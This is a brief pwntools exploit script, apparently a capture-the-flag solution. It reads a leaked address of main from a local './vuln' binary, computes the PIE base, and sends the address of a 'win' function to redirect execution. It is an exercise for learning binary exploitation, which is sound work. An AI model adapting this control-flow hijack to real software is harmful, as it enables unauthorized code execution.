from pwn import log, ELF, process


def exploit(binary: ELF, io: process):
    output = io.recvuntil(b":")
    main_line = io.recvline().decode()

    main_addr = int(main_line.strip().split()[-1], 16)
    main_offset = binary.symbols["main"]
    win_offset = binary.symbols["win"]

    pie_base = main_addr - main_offset
    log.info(f"main offset: {hex(main_offset)}")
    log.info(f"PIR base = main_addr - main_offset: {hex(pie_base)}")
    win_addr = pie_base + win_offset
    log.info(f"win offset: {hex(win_offset)}")
    log.info(f"win_addr = pie_base + win_offset: {hex(win_addr)}")

    io.sendline(hex(win_addr))


if __name__ == "__main__":
    import sys

    binary = ELF("./vuln")
    io = process(binary.path)
    exploit(binary, io)
    try:
        io.recvall().decode(errors="ignore")
    except EOFError:
        raise EOFError("Failed to receive all output.")
